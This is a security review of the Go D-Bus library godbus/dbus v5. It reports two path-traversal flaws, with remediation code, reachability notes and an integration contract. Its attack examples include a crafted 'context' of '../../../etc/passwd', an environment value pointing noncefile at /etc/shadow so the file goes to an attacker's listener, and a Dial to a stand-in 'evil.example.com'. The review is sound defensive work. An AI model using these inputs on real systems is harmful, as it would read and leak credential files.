# Security Review: godbus/dbus v5

## Summary

- **Target Type**: Vendored dependency — Go D-Bus client library
- **Review date**: 2025-07-17
- **Version**: v5 (vendored, no module pin)
- **Modes Used**: A (read-only static analysis)
- **Findings**: 2 (1 Critical, 1 Medium)
- **Risk Level**: Medium (critical finding is dormant in current callers)
- **Rule of Two Violation**: No — the library processes untrusted wire data and can change filesystem state, but in the `go-keyring` usage it connects only to the local trusted session bus.
- **Confidence**: High
- **Dependencies reviewed**: 0 external (stdlib only)
- **Reachability in go-keyring**: The critical path-traversal in `DBUS_COOKIE_SHA1` is **not reachable** through `go-keyring` on Linux because the default auth method is `AuthExternal`, not `AuthCookieSha1`. The vulnerability _is_ reachable on Windows or if any caller explicitly passes `AuthCookieSha1` to `conn.Auth()`.

---

## Findings

### [SEC-001] Path Traversal in DBUS_COOKIE_SHA1 Authentication — Arbitrary File Read (Critical)

- **Category**: Path Traversal / Injection
- **OWASP Reference**: MCP05 / ASI05
- **Location**: `auth_sha1_windows.go:66`
- **Confidence**: High
- **Issue**: The `context` value, received from the D-Bus authentication challenge over the wire (attacker-controlled), is concatenated directly into a filesystem path with no sanitization. A malicious D-Bus daemon or MITM attacker can read arbitrary files on the client filesystem.

- **Attack Path**:
  1. Client connects to a D-Bus daemon (via Unix socket or TCP).
  2. The daemon sends an authentication challenge containing a crafted `context` field, e.g. `../../../etc/passwd`.
  3. `HandleData()` hex-decodes the challenge, splits on spaces, and extracts `context` from `b[0]`.
  4. `getCookie()` constructs the path: `a.home + "/.dbus-keyrings/" + string(context)`.
  5. `os.Open()` resolves the path and opens the attacker-targeted file. Contents are read and hashed into the auth response (partial exfiltration via SHA-1 challenge-response; full content is **not** directly leaked back to the attacker, but the attacker learns whether the file exists and its SHA-1-derived hash).

- **Attacker-Controlled**: Yes — the `context` byte slice originates from the hex-decoded `data` parameter of `HandleData()`, which is raw wire input from the D-Bus auth protocol.

- **Guard/Mitigation Present**: None. No `filepath.Clean`, no path validation, no character allowlist.

- **Residual Exploitability**: A `context` of `../../../etc/passwd` resolves to `/etc/passwd` (assuming `home=/home/user`). The file is opened and its contents are read line-by-line looking for a matching cookie ID. While the contents aren't directly exfiltrated, the attacker can:
  - Confirm file existence (different error behavior).
  - Potentially read files whose content matches the cookie format (`<id> <timestamp> <value>`).
  - Use as a building block in a chain — e.g., read `~/.dbus-keyrings/` from a different user if home directory is known.

- **Evidence**:
  ```go
  // auth_sha1_windows.go:65-67
  func (a authCookieSha1) getCookie(context, id []byte) []byte {
      file, err := os.Open(a.home + "/.dbus-keyrings/" + string(context))
      //                                         ^^^^^^^^^^^^^^^^^
      //                                         context is attacker-controlled wire data
  ```

- **Remediation**: Apply `filepath.Clean()` and validate that the result is still within the `.dbus-keyrings` directory:
  ```go
  clean := filepath.Clean(string(context))
  if filepath.IsAbs(clean) || strings.Contains(clean, "..") {
      return nil
  }
  file, err := os.Open(filepath.Join(a.home, ".dbus-keyrings", clean))
  ```

- **Reachability in go-keyring**: **Not currently reachable.** On Linux, `getDefaultAuthMethods()` returns `[]Auth{AuthExternal(user)}` — the cookie SHA1 mechanism is only the default on Windows. The `go-keyring` package is only compiled on Linux (`keyring_unix.go` has build tag `linux`). No caller passes `AuthCookieSha1` explicitly. However, if the codebase ever adds Windows support or a caller explicitly uses `WithAuth(AuthCookieSha1(...))`, the vulnerability becomes live.

---

### [SEC-002] Environment-Controlled File Read in nonce-tcp Transport (Medium)

- **Category**: Path Traversal / Information Disclosure
- **OWASP Reference**: MCP05
- **Location**: `transport_nonce_tcp.go:30`
- **Confidence**: Medium
- **Issue**: The `noncefile` parameter from the D-Bus address string is passed directly to `os.ReadFile()` without any path sanitization. The address string is sourced from environment variables (`DBUS_SESSION_BUS_ADDRESS`, etc.), so a local attacker who can set environment variables can read arbitrary files.

- **Attack Path**:
  1. Attacker sets `DBUS_SESSION_BUS_ADDRESS=nonce-tcp:host=127.0.0.1,port=1234,noncefile=/etc/shadow`.
  2. Application calls `ConnectSessionBus()` → `getTransport()` → `newNonceTcpTransport()`.
  3. `os.ReadFile("/etc/shadow")` is called with the attacker-controlled path.
  4. The file contents are sent over the TCP connection to the attacker's listener.

- **Attacker-Controlled**: Partial — requires local access to set environment variables.

- **Guard/Mitigation Present**: None on the path itself. The TCP connection must succeed for the file contents to be exfiltrated, but an attacker can listen on the specified port.

- **Evidence**:
  ```go
  // transport_nonce_tcp.go:17-30
  func newNonceTcpTransport(keys string) (transport, error) {
      ...
      noncefile := getKey(keys, "noncefile")
      ...
      b, err := os.ReadFile(noncefile)
      //                   ^^^^^^^^^ attacker-influenced path
  ```

- **Remediation**: Apply `filepath.Clean()` and validate the path is within an expected directory, or restrict `noncefile` to a known safe prefix. Alternatively, document that `nonce-tcp` transport should not be used with untrusted address strings.

- **Reachability in go-keyring**: Low. `go-keyring` uses the default Unix socket transport (`unix:path=...`), not `nonce-tcp`. The address is sourced from `DBUS_SESSION_BUS_ADDRESS` which is typically controlled by the session bus itself, not user input.

---

## Secure-by-Design Patterns (No Action Required)

| Pattern | Location | Why Safe |
|---------|----------|----------|
| Message size limit (128 MB) | `message.go:144`, `transport_unix.go:113` | Prevents memory exhaustion from oversized messages |
| Recursion depth limit (64) | `decoder.go:163,179,193` | Prevents stack overflow from deeply nested types |
| `unsafe.String` | `decoder.go:274` | Zero-alloc optimization on a buffer known not to be mutated; standard library idiom |
| Endianness detection via `unsafe.Pointer` | `transport_generic.go:14` | Well-known idiom; executes once at init |
| ObjectPath validation | `dbus.go:199-218` | All paths validated before use; character set restricted to `[A-Za-z0-9_/]` |
| Interface/member name validation | `dbus.go:222-264` | Strict character allowlist prevents injection in match rules and XML output |
| No `shell=True` or command execution | — | Library has no shell or process execution (except `dbus-launch` discovery, which uses fixed args) |
| Decoder panics captured as errors | `decoder.go:71-77` | All decode panics become returned errors — no crashes from malformed input |

---

## Integration Contract

### go-keyring Usage of godbus/dbus

The vendored `godbus/dbus` library is used by `go-keyring` to communicate with the
freedesktop.org Secret Service API over the local D-Bus session bus.

### Input bounds

- **Accepted**: `dbus.Connect(address)` with a D-Bus address string (e.g. `unix:path=/run/user/1000/bus`).
- **Rejected**: Invalid address formats return errors; malformed D-Bus messages return `InvalidMessageError` or `FormatError`.
- **Max safe size**: D-Bus messages limited to 128 MB (1<<27 bytes). Larger messages are rejected with `InvalidMessageError`.

### Output shape

- **Return type**: `*dbus.Conn` (connected and authenticated) or error.
- **Nil guarantees**: On success, `Conn` is non-nil and ready for `Hello()`. On error, `Conn` is nil.
- **Method call results**: Returned as `*dbus.Call` with `Body []any` slice. Strings are valid UTF-8. Unix FDs are represented as `UnixFD` values.
- **Signal delivery**: Signals delivered as `*dbus.Signal` structs with validated `ObjectPath` sender, interface name, and member name.

### Side effects

- **I/O**: Opens a Unix socket to the D-Bus daemon. Reads and writes D-Bus messages. On first connection, may run `dbus-launch` if no session bus address is set.
- **Allocations**: Bounded per-message (≤128 MB). Internal string converter uses 4 KB buffer pool for zero-allocation string decoding of small strings.
- **Global state**: Caches shared `systemBus` and `sessionBus` connections. Registers transport factories in package-level `transports` map at init.
- **Goroutine safety**: `Conn` methods are safe for concurrent use. Internal mutexes protect call tracking, name tracking, signal delivery, and output serialization.

### Error modes

- **Returned errors**: `InvalidMessageError`, `FormatError`, `InvalidTypeError`, and standard Go errors (e.g. `io.EOF` on connection close).
- **Panics**: `encode()` and `decode()` use `panic/recover` internally; all panics are captured and returned as `FormatError`. `Send()` panics on unbuffered channel or nil context (programmer error, not input-driven). `Signal()` panics if the handler is not a `SignalRegistrar`.
- **Timeouts**: None built-in. Callers should use `context.Context` for cancellation. The `inWorker` goroutine blocks on `ReadMessage()` indefinitely.

### Resource bounds

- **Memory**: O(message size) per message, bounded at 128 MB. Internal call tracker grows with pending method calls (unbounded if replies are never received).
- **CPU**: O(message size) for encode/decode. Recursive type depth limited to 64.
- **Stack**: Recursion bounded at depth 64 for nested types.

### Explicit non-guarantees

- Does NOT validate that the D-Bus daemon is trusted. Authentication uses `EXTERNAL` (Unix socket credentials) or `DBUS_COOKIE_SHA1` — neither verifies the daemon's identity cryptographically.
- Does NOT sanitize `context` values in `DBUS_COOKIE_SHA1` authentication — path traversal is possible (see SEC-001).
- Does NOT sanitize `noncefile` paths in `nonce-tcp` transport — arbitrary file reads possible via environment-controlled addresses (see SEC-002).
- Does NOT enforce timeouts on any I/O operation. Callers must use context cancellation.
- Does NOT limit the number of pending method calls. A slow or malicious peer can exhaust memory by never replying.

### Integration examples

**CORRECT — default connection on Linux (what go-keyring does):**

```go
conn, err := dbus.ConnectSessionBus()  // uses EXTERNAL auth via Unix socket
if err != nil {
    return err
}
// conn is authenticated and ready
obj := conn.Object("org.freedesktop.secrets", "/org/freedesktop/secrets")
call := obj.Call("org.freedesktop.Secret.Service.OpenSession", 0, "plain", dbus.Variant{})
```

**INCORRECT — explicitly using cookie auth without path sanitization:**

```go
// Vulnerable to path traversal if the D-Bus daemon is malicious
conn, err := dbus.Dial("tcp:host=evil.example.com,port=5555",
    dbus.WithAuth(dbus.AuthCookieSha1("user", "/home/user")))
```

### Trust boundary

- The D-Bus daemon is assumed **trusted** in the go-keyring use case (local Unix socket).
- If connecting to a remote or untrusted D-Bus daemon, the `DBUS_COOKIE_SHA1` auth mechanism is vulnerable to path traversal.
- The `nonce-tcp` transport reads files from paths specified in the address string, which is sourced from environment variables.
